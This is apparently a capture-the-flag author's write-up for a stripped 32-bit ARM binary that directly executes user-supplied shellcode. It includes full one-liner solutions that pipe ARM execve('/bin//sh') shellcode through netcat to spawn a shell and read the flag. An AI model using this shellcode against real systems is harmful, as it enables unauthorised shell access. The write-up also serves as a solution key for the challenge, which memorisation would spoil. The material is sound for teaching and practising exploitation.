The given challenge binary's architecture is **32-bit ARM** running on an Ubuntu x86-64 docker. The docker container needs some preinstalled tools to run the binary properly which I've included in Dockerfile. Participants have to find a suitable **shellcode** to give as input to the program which will be directly executed. Before the shellcode can be given as input, two questions will be asked about the architecture. Answer to these questions can be easily found just by looking at the decompiled binary in Ghidra.
To make reading of the binary in Ghidra difficult, symbols have been stripped so that function names are not visible. But keen eyes would easily understand that the challenge requires direct shellcode input and upon successful execution a shell will be returned through which `flag.txt` can be read. Added some story to make the challenge a bit more interesting to interact :)
Participants can either use pwntools or a one line exploit can also be written like following:

(Final payload using Python 2)
```bash
(python -c 'print "ARM\n32-bit\n\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"'; cat) | nc <ip> <port>
```
(Final payload using Python 3)
```bash
(python3 -c 'import sys; sys.stdout.buffer.write(b"ARM\n32-bit\n\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\n")'; cat) | nc <ip> <port>
```
Compiled with `arm-linux-gnueabihf-gcc -s -static -o chal chal.c`. `-s` is for stripping symbols to make reading in Ghidra a bit difficult :)
